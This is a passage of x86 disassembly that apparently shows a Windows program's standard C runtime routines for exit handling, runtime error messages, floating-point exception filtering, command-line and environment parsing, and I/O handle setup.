  422cd7:	ret    
  422cd8:	push   ebp
  422cd9:	mov    ebp,esp
  422cdb:	push   esi
  422cdc:	push   edi
  422cdd:	push   0x8
  422cdf:	call   0x423b0f
  422ce4:	xor    esi,esi
  422ce6:	inc    esi
  422ce7:	cmp    DWORD PTR ds:0x464da4,esi
  422ced:	pop    ecx
  422cee:	jne    0x422d00
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	call   DWORD PTR ds:0x428074
  422cf9:	push   eax
  422cfa:	call   DWORD PTR ds:0x428070
  422d00:	cmp    DWORD PTR [ebp+0xc],0x0
  422d04:	mov    al,BYTE PTR [ebp+0x10]
  422d07:	mov    DWORD PTR ds:0x464da0,esi
  422d0d:	mov    ds:0x464d9c,al
  422d12:	jne    0x422d66
  422d14:	mov    ecx,DWORD PTR ds:0x465508
  422d1a:	test   ecx,ecx
  422d1c:	je     0x422d47
  422d1e:	mov    eax,ds:0x465504
  422d23:	sub    eax,0x4
  422d26:	cmp    eax,ecx
  422d28:	jmp    0x422d40
  422d2a:	mov    eax,DWORD PTR [eax]
  422d2c:	test   eax,eax
  422d2e:	je     0x422d32
  422d30:	call   eax
  422d32:	mov    eax,ds:0x465504
  422d37:	sub    eax,0x4
  422d3a:	cmp    eax,DWORD PTR ds:0x465508
  422d40:	mov    ds:0x465504,eax
  422d45:	jae    0x422d2a
  422d47:	mov    eax,0x42a01c
  422d4c:	mov    esi,0x42a020
  422d51:	cmp    eax,esi
  422d53:	mov    edi,eax
  422d55:	jae    0x422d66
  422d57:	mov    eax,DWORD PTR [edi]
  422d59:	test   eax,eax
  422d5b:	je     0x422d5f
  422d5d:	call   eax
  422d5f:	add    edi,0x4
  422d62:	cmp    edi,esi
  422d64:	jb     0x422d57
  422d66:	mov    eax,0x42a024
  422d6b:	mov    esi,0x42a028
  422d70:	cmp    eax,esi
  422d72:	mov    edi,eax
  422d74:	jae    0x422d85
  422d76:	mov    eax,DWORD PTR [edi]
  422d78:	test   eax,eax
  422d7a:	je     0x422d7e
  422d7c:	call   eax
  422d7e:	add    edi,0x4
  422d81:	cmp    edi,esi
  422d83:	jb     0x422d76
  422d85:	cmp    DWORD PTR [ebp+0x10],0x0
  422d89:	pop    edi
  422d8a:	pop    esi
  422d8b:	je     0x422d96
  422d8d:	push   0x8
  422d8f:	call   0x423a7b
  422d94:	jmp    0x422da8
  422d96:	push   DWORD PTR [ebp+0x8]
  422d99:	mov    DWORD PTR ds:0x464da4,0x1
  422da3:	call   0x422c31
  422da8:	pop    ecx
  422da9:	pop    ebp
  422daa:	ret    
  422dab:	push   0x0
  422dad:	push   0x0
  422daf:	push   DWORD PTR [esp+0xc]
  422db3:	call   0x422cd8
  422db8:	add    esp,0xc
  422dbb:	ret    
  422dbc:	push   0x0
  422dbe:	push   0x1
  422dc0:	push   DWORD PTR [esp+0xc]
  422dc4:	call   0x422cd8
  422dc9:	add    esp,0xc
  422dcc:	ret    
  422dcd:	push   0x1
  422dcf:	push   0x0
  422dd1:	push   0x0
  422dd3:	call   0x422cd8
  422dd8:	add    esp,0xc
  422ddb:	ret    
  422ddc:	push   0x1
  422dde:	push   0x1
  422de0:	push   0x0
  422de2:	call   0x422cd8
  422de7:	add    esp,0xc
  422dea:	ret    
  422deb:	push   ebp
  422dec:	mov    ebp,esp
  422dee:	sub    esp,0x10c
  422df4:	mov    eax,ds:0x4646c0
  422df9:	xor    eax,DWORD PTR [ebp+0x4]
  422dfc:	mov    ecx,DWORD PTR [ebp+0x8]
  422dff:	push   ebx
  422e00:	push   esi
  422e01:	mov    DWORD PTR [ebp-0x4],eax
  422e04:	xor    edx,edx
  422e06:	push   edi
  422e07:	xor    eax,eax
  422e09:	cmp    ecx,DWORD PTR [eax*8+0x464458]
  422e10:	je     0x422e18
  422e12:	inc    eax
  422e13:	cmp    eax,0x12
  422e16:	jb     0x422e09
  422e18:	mov    esi,eax
  422e1a:	shl    esi,0x3
  422e1d:	cmp    ecx,DWORD PTR [esi+0x464458]
  422e23:	jne    0x422f4c
  422e29:	mov    eax,ds:0x464d5c
  422e2e:	cmp    eax,0x1
  422e31:	je     0x422f27
  422e37:	cmp    eax,edx
  422e39:	jne    0x422e48
  422e3b:	cmp    DWORD PTR ds:0x464450,0x1
  422e42:	je     0x422f27
  422e48:	cmp    ecx,0xfc
  422e4e:	je     0x422f4c
  422e54:	push   0x104
  422e59:	lea    eax,[ebp-0x10c]
  422e5f:	push   eax
  422e60:	push   edx
  422e61:	mov    BYTE PTR [ebp-0x8],dl
  422e64:	call   DWORD PTR ds:0x428080
  422e6a:	test   eax,eax
  422e6c:	jne    0x422e81
  422e6e:	lea    eax,[ebp-0x10c]
  422e74:	push   0x4284dc
  422e79:	push   eax
  422e7a:	call   0x423d30
  422e7f:	pop    ecx
  422e80:	pop    ecx
  422e81:	lea    eax,[ebp-0x10c]
  422e87:	push   eax
  422e88:	lea    edi,[ebp-0x10c]
  422e8e:	call   0x423f60
  422e93:	inc    eax
  422e94:	cmp    eax,0x3c
  422e97:	pop    ecx
  422e98:	jbe    0x422ec3
  422e9a:	lea    eax,[ebp-0x10c]
  422ea0:	push   eax
  422ea1:	call   0x423f60
  422ea6:	mov    edi,eax
  422ea8:	lea    eax,[ebp-0x10c]
  422eae:	sub    eax,0x3b
  422eb1:	push   0x3
  422eb3:	add    edi,eax
  422eb5:	push   0x4284d8
  422eba:	push   edi
  422ebb:	call   0x423e30
  422ec0:	add    esp,0x10
  422ec3:	push   edi
  422ec4:	call   0x423f60
  422ec9:	push   DWORD PTR [esi+0x46445c]
  422ecf:	mov    ebx,eax
  422ed1:	call   0x423f60
  422ed6:	lea    eax,[ebx+eax*1+0x1c]
  422eda:	pop    ecx
  422edb:	add    eax,0x3
  422ede:	pop    ecx
  422edf:	and    eax,0xfffffffc
  422ee2:	call   0x4239a0
  422ee7:	mov    ebx,esp
  422ee9:	push   0x4284bc
  422eee:	push   ebx
  422eef:	call   0x423d30
  422ef4:	push   edi
  422ef5:	push   ebx
  422ef6:	call   0x423d40
  422efb:	push   0x4284b8
  422f00:	push   ebx
  422f01:	call   0x423d40
  422f06:	push   DWORD PTR [esi+0x46445c]
  422f0c:	push   ebx
  422f0d:	call   0x423d40
  422f12:	push   0x12010
  422f17:	push   0x428490
  422f1c:	push   ebx
  422f1d:	call   0x423c32
  422f22:	add    esp,0x2c
  422f25:	jmp    0x422f4c
  422f27:	push   edx
  422f28:	lea    eax,[ebp+0x8]
  422f2b:	push   eax
  422f2c:	lea    esi,[esi+0x46445c]
  422f32:	push   DWORD PTR [esi]
  422f34:	call   0x423f60
  422f39:	pop    ecx
  422f3a:	push   eax
  422f3b:	push   DWORD PTR [esi]
  422f3d:	push   0xfffffff4
  422f3f:	call   DWORD PTR ds:0x42807c
  422f45:	push   eax
  422f46:	call   DWORD PTR ds:0x428078
  422f4c:	lea    esp,[ebp-0x118]
  422f52:	mov    ecx,DWORD PTR [ebp-0x4]
  422f55:	xor    ecx,DWORD PTR [ebp+0x4]
  422f58:	call   0x42401c
  422f5d:	pop    edi
  422f5e:	pop    esi
  422f5f:	pop    ebx
  422f60:	leave  
  422f61:	ret    
  422f62:	mov    eax,ds:0x464d5c
  422f67:	cmp    eax,0x1
  422f6a:	je     0x422f79
  422f6c:	test   eax,eax
  422f6e:	jne    0x422f9a
  422f70:	cmp    DWORD PTR ds:0x464450,0x1
  422f77:	jne    0x422f9a
  422f79:	push   0xfc
  422f7e:	call   0x422deb
  422f83:	mov    eax,ds:0x464da8
  422f88:	test   eax,eax
  422f8a:	pop    ecx
  422f8b:	je     0x422f8f
  422f8d:	call   eax
  422f8f:	push   0xff
  422f94:	call   0x422deb
  422f99:	pop    ecx
  422f9a:	ret    
  422f9b:	push   ebp
  422f9c:	mov    ebp,esp
  422f9e:	push   ecx
  422f9f:	push   ebx
  422fa0:	push   esi
  422fa1:	push   edi
  422fa2:	call   0x423803
  422fa7:	mov    edi,DWORD PTR [ebp+0x8]
  422faa:	mov    esi,eax
  422fac:	mov    edx,DWORD PTR [esi+0x54]
  422faf:	mov    eax,ds:0x46456c
  422fb4:	mov    ecx,edx
  422fb6:	cmp    DWORD PTR [ecx],edi
  422fb8:	je     0x422fc7
  422fba:	lea    ebx,[eax+eax*2]
  422fbd:	add    ecx,0xc
  422fc0:	lea    ebx,[edx+ebx*4]
  422fc3:	cmp    ecx,ebx
  422fc5:	jb     0x422fb6
  422fc7:	lea    eax,[eax+eax*2]
  422fca:	lea    eax,[edx+eax*4]
  422fcd:	cmp    ecx,eax
  422fcf:	jae    0x422fd5
  422fd1:	cmp    DWORD PTR [ecx],edi
  422fd3:	je     0x422fd7
  422fd5:	xor    ecx,ecx
  422fd7:	test   ecx,ecx
  422fd9:	je     0x4230f1
  422fdf:	mov    ebx,DWORD PTR [ecx+0x8]
  422fe2:	test   ebx,ebx
  422fe4:	mov    DWORD PTR [ebp+0x8],ebx
  422fe7:	je     0x4230f1
  422fed:	cmp    ebx,0x5
  422ff0:	jne    0x422ffe
  422ff2:	and    DWORD PTR [ecx+0x8],0x0
  422ff6:	xor    eax,eax
  422ff8:	inc    eax
  422ff9:	jmp    0x4230fa
  422ffe:	cmp    ebx,0x1
  423001:	je     0x4230ec
  423007:	mov    eax,DWORD PTR [esi+0x58]
  42300a:	mov    DWORD PTR [ebp-0x4],eax
  42300d:	mov    eax,DWORD PTR [ebp+0xc]
  423010:	mov    DWORD PTR [esi+0x58],eax
  423013:	mov    eax,DWORD PTR [ecx+0x4]
  423016:	cmp    eax,0x8
  423019:	jne    0x4230de
  42301f:	mov    edx,DWORD PTR ds:0x464560
  423025:	mov    eax,ds:0x464564
  42302a:	add    eax,edx
  42302c:	cmp    edx,eax
  42302e:	jge    0x423057
  423030:	lea    eax,[edx+edx*2]
  423033:	shl    eax,0x2
  423036:	mov    edi,DWORD PTR [esi+0x54]
  423039:	and    DWORD PTR [eax+edi*1+0x8],0x0
  42303e:	mov    edi,DWORD PTR ds:0x464560
  423044:	mov    ebx,DWORD PTR ds:0x464564
  42304a:	inc    edx
  42304b:	add    ebx,edi
  42304d:	add    eax,0xc
  423050:	cmp    edx,ebx
  423052:	jl     0x423036
  423054:	mov    ebx,DWORD PTR [ebp+0x8]
  423057:	mov    ecx,DWORD PTR [ecx]
  423059:	cmp    ecx,0xc000008e
  42305f:	mov    edi,DWORD PTR [esi+0x5c]
  423062:	jne    0x42306d
  423064:	mov    DWORD PTR [esi+0x5c],0x83
  42306b:	jmp    0x4230d1
  42306d:	cmp    ecx,0xc0000090
  423073:	jne    0x42307e
  423075:	mov    DWORD PTR [esi+0x5c],0x81
  42307c:	jmp    0x4230d1
  42307e:	cmp    ecx,0xc0000091
  423084:	jne    0x42308f
  423086:	mov    DWORD PTR [esi+0x5c],0x84
  42308d:	jmp    0x4230d1
  42308f:	cmp    ecx,0xc0000093
  423095:	jne    0x4230a0
  423097:	mov    DWORD PTR [esi+0x5c],0x85
  42309e:	jmp    0x4230d1
  4230a0:	cmp    ecx,0xc000008d
  4230a6:	jne    0x4230b1
  4230a8:	mov    DWORD PTR [esi+0x5c],0x82
  4230af:	jmp    0x4230d1
  4230b1:	cmp    ecx,0xc000008f
  4230b7:	jne    0x4230c2
  4230b9:	mov    DWORD PTR [esi+0x5c],0x86
  4230c0:	jmp    0x4230d1
  4230c2:	cmp    ecx,0xc0000092
  4230c8:	jne    0x4230d1
  4230ca:	mov    DWORD PTR [esi+0x5c],0x8a
  4230d1:	push   DWORD PTR [esi+0x5c]
  4230d4:	push   0x8
  4230d6:	call   ebx
  4230d8:	pop    ecx
  4230d9:	mov    DWORD PTR [esi+0x5c],edi
  4230dc:	jmp    0x4230e5
  4230de:	and    DWORD PTR [ecx+0x8],0x0
  4230e2:	push   eax
  4230e3:	call   ebx
  4230e5:	mov    eax,DWORD PTR [ebp-0x4]
  4230e8:	pop    ecx
  4230e9:	mov    DWORD PTR [esi+0x58],eax
  4230ec:	or     eax,0xffffffff
  4230ef:	jmp    0x4230fa
  4230f1:	push   DWORD PTR [ebp+0xc]
  4230f4:	call   DWORD PTR ds:0x428084
  4230fa:	pop    edi
  4230fb:	pop    esi
  4230fc:	pop    ebx
  4230fd:	leave  
  4230fe:	ret    
  4230ff:	cmp    DWORD PTR ds:0x46550c,0x0
  423106:	jne    0x42310d
  423108:	call   0x42453c
  42310d:	push   esi
  42310e:	mov    esi,DWORD PTR ds:0x465514
  423114:	test   esi,esi
  423116:	jne    0x42311f
  423118:	mov    esi,0x4284f3
  42311d:	jmp    0x423164
  42311f:	mov    al,BYTE PTR [esi]
  423121:	cmp    al,0x22
  423123:	jne    0x42314d
  423125:	inc    esi
  423126:	mov    al,BYTE PTR [esi]
  423128:	cmp    al,0x22
  42312a:	je     0x42315d
  42312c:	test   al,al
  42312e:	je     0x423146
  423130:	movzx  eax,al
  423133:	push   eax
  423134:	call   0x42405b
  423139:	test   eax,eax
  42313b:	pop    ecx
  42313c:	je     0x42313f
  42313e:	inc    esi
  42313f:	inc    esi
  423140:	mov    al,BYTE PTR [esi]
  423142:	cmp    al,0x22
  423144:	jne    0x42312c
  423146:	cmp    BYTE PTR [esi],0x22
  423149:	jne    0x42315e
  42314b:	jmp    0x42315d
  42314d:	cmp    al,0x20
  42314f:	jbe    0x42315e
  423151:	inc    esi
  423152:	cmp    BYTE PTR [esi],0x20
  423155:	ja     0x423151
  423157:	jmp    0x42315e
  423159:	cmp    al,0x20
  42315b:	ja     0x423164
  42315d:	inc    esi
  42315e:	mov    al,BYTE PTR [esi]
  423160:	test   al,al
  423162:	jne    0x423159
  423164:	mov    eax,esi
  423166:	pop    esi
  423167:	ret    
  423168:	push   ebx
  423169:	xor    ebx,ebx
  42316b:	cmp    DWORD PTR ds:0x46550c,ebx
  423171:	push   esi
  423172:	push   edi
  423173:	jne    0x42317a
  423175:	call   0x42453c
  42317a:	mov    esi,DWORD PTR ds:0x464d54
  423180:	xor    edi,edi
  423182:	cmp    esi,ebx
  423184:	jne    0x423198
  423186:	jmp    0x4231b8
  423188:	cmp    al,0x3d
  42318a:	je     0x42318d
  42318c:	inc    edi
  42318d:	push   esi
  42318e:	call   0x423f60
  423193:	pop    ecx
  423194:	lea    esi,[esi+eax*1+0x1]
  423198:	mov    al,BYTE PTR [esi]
  42319a:	cmp    al,bl
  42319c:	jne    0x423188
  42319e:	lea    eax,[edi*4+0x4]
  4231a5:	push   eax
  4231a6:	call   0x424672
  4231ab:	mov    edi,eax
  4231ad:	cmp    edi,ebx
  4231af:	pop    ecx
  4231b0:	mov    DWORD PTR ds:0x464d84,edi
  4231b6:	jne    0x4231bd
  4231b8:	or     eax,0xffffffff
  4231bb:	jmp    0x423215
  4231bd:	mov    esi,DWORD PTR ds:0x464d54
  4231c3:	push   ebp
  4231c4:	jmp    0x4231f0
  4231c6:	push   esi
  4231c7:	call   0x423f60
  4231cc:	mov    ebp,eax
  4231ce:	inc    ebp
  4231cf:	cmp    BYTE PTR [esi],0x3d
  4231d2:	pop    ecx
  4231d3:	je     0x4231ee
  4231d5:	push   ebp
  4231d6:	call   0x424672
  4231db:	cmp    eax,ebx
  4231dd:	pop    ecx
  4231de:	mov    DWORD PTR [edi],eax
  4231e0:	je     0x423219
  4231e2:	push   esi
  4231e3:	push   eax
  4231e4:	call   0x423d30
  4231e9:	pop    ecx
  4231ea:	pop    ecx
  4231eb:	add    edi,0x4
  4231ee:	add    esi,ebp
  4231f0:	cmp    BYTE PTR [esi],bl
  4231f2:	jne    0x4231c6
  4231f4:	push   DWORD PTR ds:0x464d54
  4231fa:	call   0x42455a
  4231ff:	mov    DWORD PTR ds:0x464d54,ebx
  423205:	mov    DWORD PTR [edi],ebx
  423207:	mov    DWORD PTR ds:0x465500,0x1
  423211:	xor    eax,eax
  423213:	pop    ecx
  423214:	pop    ebp
  423215:	pop    edi
  423216:	pop    esi
  423217:	pop    ebx
  423218:	ret    
  423219:	push   DWORD PTR ds:0x464d84
  42321f:	call   0x42455a
  423224:	mov    DWORD PTR ds:0x464d84,ebx
  42322a:	or     eax,0xffffffff
  42322d:	jmp    0x423213
  42322f:	push   ebp
  423230:	mov    ebp,esp
  423232:	push   ecx
  423233:	push   ebx
  423234:	mov    ebx,DWORD PTR [ebp+0xc]
  423237:	xor    edx,edx
  423239:	cmp    DWORD PTR [ebp+0x8],edx
  42323c:	push   edi
  42323d:	mov    DWORD PTR [esi],edx
  42323f:	mov    edi,ecx
  423241:	mov    DWORD PTR [ebx],0x1
  423247:	je     0x423252
  423249:	mov    ecx,DWORD PTR [ebp+0x8]
  42324c:	add    DWORD PTR [ebp+0x8],0x4
  423250:	mov    DWORD PTR [ecx],edi
  423252:	cmp    BYTE PTR [eax],0x22
  423255:	jne    0x423265
  423257:	xor    ecx,ecx
  423259:	test   edx,edx
  42325b:	sete   cl
  42325e:	inc    eax
  42325f:	mov    edx,ecx
  423261:	mov    cl,0x22
  423263:	jmp    0x423292
  423265:	inc    DWORD PTR [esi]
  423267:	test   edi,edi
  423269:	je     0x423270
  42326b:	mov    cl,BYTE PTR [eax]
  42326d:	mov    BYTE PTR [edi],cl
  42326f:	inc    edi
  423270:	mov    cl,BYTE PTR [eax]
  423272:	movzx  ebx,cl
  423275:	inc    eax
  423276:	test   BYTE PTR [ebx+0x4651c1],0x4
  42327d:	je     0x42328b
  42327f:	inc    DWORD PTR [esi]
  423281:	test   edi,edi
  423283:	je     0x42328a
  423285:	mov    bl,BYTE PTR [eax]
  423287:	mov    BYTE PTR [edi],bl
  423289:	inc    edi
  42328a:	inc    eax
  42328b:	test   cl,cl
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	je     0x4232c4
  423292:	test   edx,edx
  423294:	jne    0x423252
  423296:	cmp    cl,0x20
  423299:	je     0x4232a0
  42329b:	cmp    cl,0x9
  42329e:	jne    0x423252
  4232a0:	test   edi,edi
  4232a2:	je     0x4232a8
  4232a4:	and    BYTE PTR [edi-0x1],0x0
  4232a8:	and    DWORD PTR [ebp-0x4],0x0
  4232ac:	cmp    BYTE PTR [eax],0x0
  4232af:	je     0x42338b
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	cmp    cl,0x20
  4232ba:	je     0x4232c1
  4232bc:	cmp    cl,0x9
  4232bf:	jne    0x4232c7
  4232c1:	inc    eax
  4232c2:	jmp    0x4232b5
  4232c4:	dec    eax
  4232c5:	jmp    0x4232a8
  4232c7:	cmp    BYTE PTR [eax],0x0
  4232ca:	je     0x42338b
  4232d0:	cmp    DWORD PTR [ebp+0x8],0x0
  4232d4:	je     0x4232df
  4232d6:	mov    ecx,DWORD PTR [ebp+0x8]
  4232d9:	add    DWORD PTR [ebp+0x8],0x4
  4232dd:	mov    DWORD PTR [ecx],edi
  4232df:	inc    DWORD PTR [ebx]
  4232e1:	xor    ebx,ebx
  4232e3:	inc    ebx
  4232e4:	xor    edx,edx
  4232e6:	jmp    0x4232ea
  4232e8:	inc    eax
  4232e9:	inc    edx
  4232ea:	cmp    BYTE PTR [eax],0x5c
  4232ed:	je     0x4232e8
  4232ef:	cmp    BYTE PTR [eax],0x22
  4232f2:	jne    0x42331a
  4232f4:	test   dl,0x1
  4232f7:	jne    0x423318
  4232f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4232fd:	je     0x42330b
  4232ff:	lea    ecx,[eax+0x1]
  423302:	cmp    BYTE PTR [ecx],0x22
  423305:	jne    0x42330b
  423307:	mov    eax,ecx
  423309:	jmp    0x42330d
  42330b:	xor    ebx,ebx
  42330d:	xor    ecx,ecx
  42330f:	cmp    DWORD PTR [ebp-0x4],ecx
  423312:	sete   cl
  423315:	mov    DWORD PTR [ebp-0x4],ecx
  423318:	shr    edx,1
  42331a:	test   edx,edx
  42331c:	je     0x42332b
  42331e:	test   edi,edi
  423320:	je     0x423326
  423322:	mov    BYTE PTR [edi],0x5c
  423325:	inc    edi
  423326:	inc    DWORD PTR [esi]
  423328:	dec    edx
  423329:	jne    0x42331e
  42332b:	mov    cl,BYTE PTR [eax]
  42332d:	test   cl,cl
  42332f:	je     0x423379
  423331:	cmp    DWORD PTR [ebp-0x4],0x0
  423335:	jne    0x423341
  423337:	cmp    cl,0x20
  42333a:	je     0x423379
  42333c:	cmp    cl,0x9
  42333f:	je     0x423379
  423341:	test   ebx,ebx
  423343:	je     0x423373
  423345:	test   edi,edi
  423347:	je     0x423362
  423349:	movzx  edx,cl
  42334c:	test   BYTE PTR [edx+0x4651c1],0x4
  423353:	je     0x42335b
  423355:	mov    BYTE PTR [edi],cl
  423357:	inc    edi
  423358:	inc    eax
  423359:	inc    DWORD PTR [esi]
  42335b:	mov    cl,BYTE PTR [eax]
  42335d:	mov    BYTE PTR [edi],cl
  42335f:	inc    edi
  423360:	jmp    0x423371
  423362:	movzx  ecx,cl
  423365:	test   BYTE PTR [ecx+0x4651c1],0x4
  42336c:	je     0x423371
  42336e:	inc    eax
  42336f:	inc    DWORD PTR [esi]
  423371:	inc    DWORD PTR [esi]
  423373:	inc    eax
  423374:	jmp    0x4232e1
  423379:	test   edi,edi
  42337b:	je     0x423381
  42337d:	and    BYTE PTR [edi],0x0
  423380:	inc    edi
  423381:	inc    DWORD PTR [esi]
  423383:	mov    ebx,DWORD PTR [ebp+0xc]
  423386:	jmp    0x4232ac
  42338b:	mov    eax,DWORD PTR [ebp+0x8]
  42338e:	test   eax,eax
  423390:	je     0x423395
  423392:	and    DWORD PTR [eax],0x0
  423395:	inc    DWORD PTR [ebx]
  423397:	pop    edi
  423398:	pop    ebx
  423399:	leave  
  42339a:	ret    
  42339b:	push   ebp
  42339c:	mov    ebp,esp
  42339e:	push   ecx
  42339f:	push   ecx
  4233a0:	push   ebx
  4233a1:	push   esi
  4233a2:	push   edi
  4233a3:	xor    edi,edi
  4233a5:	cmp    DWORD PTR ds:0x46550c,edi
  4233ab:	jne    0x4233b2
  4233ad:	call   0x42453c
  4233b2:	and    BYTE PTR ds:0x464eb4,0x0
  4233b9:	push   0x104
  4233be:	mov    esi,0x464db0
  4233c3:	push   esi
  4233c4:	push   edi
  4233c5:	call   DWORD PTR ds:0x428080
  4233cb:	mov    eax,ds:0x465514
  4233d0:	cmp    eax,edi
  4233d2:	mov    DWORD PTR ds:0x464d94,esi
  4233d8:	je     0x4233e1
  4233da:	cmp    BYTE PTR [eax],0x0
  4233dd:	mov    ebx,eax
  4233df:	jne    0x4233e3
  4233e1:	mov    ebx,esi
  4233e3:	lea    eax,[ebp-0x4]
  4233e6:	push   eax
  4233e7:	push   edi
  4233e8:	lea    esi,[ebp-0x8]
  4233eb:	xor    ecx,ecx
  4233ed:	mov    eax,ebx
  4233ef:	call   0x42322f
  4233f4:	mov    esi,DWORD PTR [ebp-0x4]
  4233f7:	mov    eax,DWORD PTR [ebp-0x8]
  4233fa:	shl    esi,0x2
  4233fd:	add    eax,esi
  4233ff:	push   eax
  423400:	call   0x424672
  423405:	mov    edi,eax
  423407:	add    esp,0xc
  42340a:	test   edi,edi
  42340c:	jne    0x423413
  42340e:	or     eax,0xffffffff
  423411:	jmp    0x423438
  423413:	lea    eax,[ebp-0x4]
  423416:	push   eax
  423417:	lea    ecx,[esi+edi*1]
  42341a:	push   edi
  42341b:	lea    esi,[ebp-0x8]
  42341e:	mov    eax,ebx
  423420:	call   0x42322f
  423425:	mov    eax,DWORD PTR [ebp-0x4]
  423428:	dec    eax
  423429:	pop    ecx
  42342a:	mov    ds:0x464d78,eax
  42342f:	pop    ecx
  423430:	mov    DWORD PTR ds:0x464d7c,edi
  423436:	xor    eax,eax
  423438:	pop    edi
  423439:	pop    esi
  42343a:	pop    ebx
  42343b:	leave  
  42343c:	ret    
  42343d:	push   ecx
  42343e:	push   ecx
  42343f:	mov    eax,ds:0x464eb8
  423444:	push   ebx
  423445:	push   ebp
  423446:	push   esi
  423447:	push   edi
  423448:	mov    edi,DWORD PTR ds:0x428094
  42344e:	xor    ebx,ebx
  423450:	xor    esi,esi
  423452:	cmp    eax,ebx
  423454:	push   0x2
  423456:	pop    ebp
  423457:	jne    0x423486
  423459:	call   edi
  42345b:	mov    esi,eax
  42345d:	cmp    esi,ebx
  42345f:	je     0x42346d
  423461:	mov    DWORD PTR ds:0x464eb8,0x1
  42346b:	jmp    0x42348b
  42346d:	call   DWORD PTR ds:0x428034
  423473:	cmp    eax,0x78
  423476:	jne    0x423481
  423478:	mov    eax,ebp
  42347a:	mov    ds:0x464eb8,eax
  42347f:	jmp    0x423486
  423481:	mov    eax,ds:0x464eb8
  423486:	cmp    eax,0x1
  423489:	jne    0x423508
  42348b:	cmp    esi,ebx
  42348d:	jne    0x423497
  42348f:	call   edi
  423491:	mov    esi,eax
  423493:	cmp    esi,ebx
  423495:	je     0x423510
  423497:	cmp    WORD PTR [esi],bx
  42349a:	mov    eax,esi
  42349c:	je     0x4234ac
  42349e:	add    eax,ebp
  4234a0:	cmp    WORD PTR [eax],bx
  4234a3:	jne    0x42349e
  4234a5:	add    eax,ebp
  4234a7:	cmp    WORD PTR [eax],bx
  4234aa:	jne    0x42349e
  4234ac:	mov    edi,DWORD PTR ds:0x428090
  4234b2:	push   ebx
  4234b3:	push   ebx
  4234b4:	push   ebx
  4234b5:	sub    eax,esi
  4234b7:	push   ebx
  4234b8:	sar    eax,1
  4234ba:	inc    eax
  4234bb:	push   eax
  4234bc:	push   esi
  4234bd:	push   ebx
  4234be:	push   ebx
  4234bf:	mov    DWORD PTR [esp+0x34],eax
  4234c3:	call   edi
  4234c5:	mov    ebp,eax
  4234c7:	cmp    ebp,ebx
  4234c9:	je     0x4234fd
  4234cb:	push   ebp
  4234cc:	call   0x424672
  4234d1:	cmp    eax,ebx
  4234d3:	pop    ecx
  4234d4:	mov    DWORD PTR [esp+0x10],eax
  4234d8:	je     0x4234fd
  4234da:	push   ebx
  4234db:	push   ebx
  4234dc:	push   ebp
  4234dd:	push   eax
  4234de:	push   DWORD PTR [esp+0x24]
  4234e2:	push   esi
  4234e3:	push   ebx
  4234e4:	push   ebx
  4234e5:	call   edi
  4234e7:	test   eax,eax
  4234e9:	jne    0x4234f9
  4234eb:	push   DWORD PTR [esp+0x10]
  4234ef:	call   0x42455a
  4234f4:	pop    ecx
  4234f5:	mov    DWORD PTR [esp+0x10],ebx
  4234f9:	mov    ebx,DWORD PTR [esp+0x10]
  4234fd:	push   esi
  4234fe:	call   DWORD PTR ds:0x42808c
  423504:	mov    eax,ebx
  423506:	jmp    0x423558
  423508:	cmp    eax,ebp
  42350a:	je     0x423514
  42350c:	cmp    eax,ebx
  42350e:	je     0x423514
  423510:	xor    eax,eax
  423512:	jmp    0x423558
  423514:	call   DWORD PTR ds:0x428018
  42351a:	mov    esi,eax
  42351c:	cmp    esi,ebx
  42351e:	je     0x423510
  423520:	cmp    BYTE PTR [esi],bl
  423522:	je     0x42352e
  423524:	inc    eax
  423525:	cmp    BYTE PTR [eax],bl
  423527:	jne    0x423524
  423529:	inc    eax
  42352a:	cmp    BYTE PTR [eax],bl
  42352c:	jne    0x423524
  42352e:	sub    eax,esi
  423530:	inc    eax
  423531:	mov    ebp,eax
  423533:	push   ebp
  423534:	call   0x424672
  423539:	mov    edi,eax
  42353b:	cmp    edi,ebx
  42353d:	pop    ecx
  42353e:	jne    0x423544
  423540:	xor    edi,edi
  423542:	jmp    0x42354f
  423544:	push   ebp
  423545:	push   esi
  423546:	push   edi
  423547:	call   0x424690
  42354c:	add    esp,0xc
  42354f:	push   esi
  423550:	call   DWORD PTR ds:0x428088
  423556:	mov    eax,edi
  423558:	pop    edi
  423559:	pop    esi
  42355a:	pop    ebp
  42355b:	pop    ebx
  42355c:	pop    ecx
  42355d:	pop    ecx
  42355e:	ret    
  42355f:	sub    esp,0x48
  423562:	push   ebx
  423563:	mov    ebx,0x480
  423568:	push   ebx
  423569:	call   0x424672
  42356e:	test   eax,eax
  423570:	pop    ecx
  423571:	jne    0x42357b
  423573:	or     eax,0xffffffff
  423576:	jmp    0x423758
  42357b:	mov    ds:0x465400,eax
  423580:	mov    DWORD PTR ds:0x4653e8,0x20
  42358a:	lea    ecx,[eax+0x480]
  423590:	jmp    0x4235b0
  423592:	and    BYTE PTR [eax+0x4],0x0
  423596:	or     DWORD PTR [eax],0xffffffff
  423599:	and    DWORD PTR [eax+0x8],0x0
  42359d:	mov    BYTE PTR [eax+0x5],0xa
  4235a1:	mov    ecx,DWORD PTR ds:0x465400
  4235a7:	add    eax,0x24
  4235aa:	add    ecx,0x480
  4235b0:	cmp    eax,ecx
  4235b2:	jb     0x423592
  4235b4:	push   ebp
  4235b5:	push   esi
  4235b6:	push   edi
  4235b7:	lea    eax,[esp+0x14]
  4235bb:	push   eax
  4235bc:	call   DWORD PTR ds:0x428060
  4235c2:	cmp    WORD PTR [esp+0x46],0x0
  4235c8:	je     0x4236b7
  4235ce:	mov    eax,DWORD PTR [esp+0x48]
  4235d2:	test   eax,eax
  4235d4:	je     0x4236b7
  4235da:	mov    edi,DWORD PTR [eax]
  4235dc:	lea    ebp,[eax+0x4]
  4235df:	lea    eax,[edi+ebp*1]
  4235e2:	mov    DWORD PTR [esp+0x10],eax
  4235e6:	mov    eax,0x800
  4235eb:	cmp    edi,eax
  4235ed:	jl     0x4235f1
  4235ef:	mov    edi,eax
  4235f1:	cmp    DWORD PTR ds:0x4653e8,edi
  4235f7:	jge    0x423647
  4235f9:	mov    esi,0x465404
  4235fe:	push   ebx
  4235ff:	call   0x424672
  423604:	test   eax,eax
  423606:	pop    ecx
  423607:	je     0x423641
  423609:	add    DWORD PTR ds:0x4653e8,0x20
  423610:	mov    DWORD PTR [esi],eax
  423612:	lea    ecx,[eax+0x480]
  423618:	jmp    0x423630
  42361a:	and    BYTE PTR [eax+0x4],0x0
